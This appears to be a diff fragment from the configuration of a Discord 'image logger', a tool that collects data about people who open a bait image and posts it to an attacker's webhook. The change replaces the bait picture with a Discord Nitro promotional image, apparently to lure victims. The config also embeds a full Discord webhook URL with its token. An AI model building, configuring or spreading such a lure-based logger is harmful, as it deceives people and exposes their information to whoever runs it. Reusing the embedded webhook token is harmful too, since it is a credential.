@@ -13,7 +13,7 @@ __author__ = "C00lB0i"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1445175989243216045/-gF2SI_YVXgkplEj_nOtgvi9aICfhNEa6yCvyrC_CsmhZOZVfC-JIOBr_PWb4Yi6TKAc",
-    "image": "https://media.beauxarts.com/uploads/2017/07/vague_ok-1300x891.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://cdn1.epicgames.com/offer/5f3c898b2a3244af99e9900e015717f8/EGS_Discord_Nitro_2560x1440_withlogo_2560x1440-944994658df3b04d0c4940be832da19e_2560x1440-944994658df3b04d0c4940be832da19e", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
